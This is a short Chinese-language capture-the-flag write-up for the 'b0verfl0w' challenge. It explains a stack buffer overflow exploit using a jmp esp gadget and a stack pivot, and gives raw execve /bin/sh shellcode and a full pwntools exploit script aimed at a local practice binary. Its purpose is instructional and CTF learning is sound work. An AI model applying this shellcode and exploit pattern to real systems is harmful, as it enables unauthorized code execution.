---
title: xctf b0verfl0w
description: write up
date: 2021-09-13 15:44:33
categories:
 - PWN
---



# x_ctf_b0verfl0w

栈可执行

![image-20210913154533194](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20210913154533194.png)

fgets可以输入50个字节，padding就占了32了，还有ebp，ret就剩10字节了，无法写入shellcode，那么我们可以考虑在栈的初始位置布置一段shellcode，然后让程序跳转到栈的起始处执行shellcode

![image-20210913154545798](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20210913154545798.png)

可以看到0x08048504为jmp esp的gadgets

![image-20210913155034057](https://gitee.com/gdmzyzl/picgo/raw/master/picbed/image-20210913155034057.png)

那么payload就可以写成

```python
jmp_esp = 0x08048504
sh = "\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sub_esp_jmp = asm('sub esp,0x28;jmp esp')
payload = sh + 'a' * (0x24-len(sh)) + p32(jmp_esp) + sub_esp_jmp
```

执行jmp esp，同时esp+4，eip指向esp，也就是指向sub esp,0x28;jmp esp，这样就可以劫持esp，跳转执行shellcode

学习点：jmp esp --> esp+4  eip=esp

```python
from pwn import *

p = process('./b0verfl0w')

r = lambda : p.recv()
rx = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()

jmp_esp = 0x08048504
sh = "\x6a\x0b\x58\x68\x2f\x73\x68\x00\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sub_esp_jmp = asm('sub esp,0x28;jmp esp')
payload = sh + 'a' * (0x24-len(sh)) + p32(jmp_esp) + sub_esp_jmp
sa('your name?\n',payload)
shell()
```

